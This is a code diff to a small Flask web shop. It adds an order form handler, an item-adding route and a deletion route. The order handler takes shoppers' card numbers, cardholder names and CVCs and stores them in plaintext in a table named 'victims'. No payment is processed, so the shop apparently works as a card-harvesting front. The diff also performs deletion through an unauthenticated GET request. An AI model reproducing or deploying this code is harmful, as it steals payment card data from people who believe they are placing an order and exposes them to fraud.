@@ -1,6 +1,7 @@
 from flask          import Flask
 from flask          import render_template
 from flask          import redirect
+from flask          import request
 from libsql_client  import create_client_sync
 from dotenv         import load_dotenv
 import os
@@ -34,7 +35,7 @@ def connect_db():
 @app.get("/")
 def home():
     client = connect_db()
-    result = client.execute("SELECT * FROM shop")
+    result = client.execute("SELECT * FROM shop WHERE stock>0 ORDER BY stock DESC")
 
     things = result.rows
 
@@ -65,12 +66,72 @@ def show_thing(id):
 def new_thing():
     return render_template("pages/thing-form.jinja")
 
+@app.get("/order/<int:id>")
+def order(id):
+    client = connect_db()
+    sql = """
+        SELECT id, item, price, stock
+        FROM shop
+        WHERE id=?
+    """
+    values = [id]
+    result = client.execute(sql, values)
+    thing = result.rows[0]
+    return render_template("pages/order-form.jinja",thing=thing)
+
+#-----------------------------------------------------------
+# Process a new thing
+#-----------------------------------------------------------
+@app.post("/add-thing")
+def add_thing():
+    name = request.form.get("name")
+    price = request.form.get("price")
+    quantity = request.form.get("quantity")
+
+    client = connect_db()
+
+    sql = """
+        INSERT INTO shop (item, price, stock)
+        VALUES (?, ?, ?)
+"""
+    values = [name, price, quantity]
+
+    client.execute(sql, values)
+    return redirect("/")
+
+@app.post("/order-thing")
+def order_thing():
+    card = request.form.get("cardnum")
+    name = request.form.get("cardname")
+    cvc = request.form.get("cvc")
+
+    client = connect_db()
+
+    sql = """
+        INSERT INTO victims (card, name, cvc)
+        VALUES (?, ?, ?)
+"""
+    values = [card, name, cvc]
+
+    client.execute(sql, values)
+    return redirect("/")
+
 
 #-----------------------------------------------------------
 # Thing deletion
 #-----------------------------------------------------------
 @app.get("/delete/<int:id>")
 def delete_thing(id):
+
+    client = connect_db()
+
+    sql = """
+        DELETE FROM shop
+        WHERE id=?
+"""
+    values = [id]
+
+    result = client.execute(sql, values)
     return redirect("/")
 
 
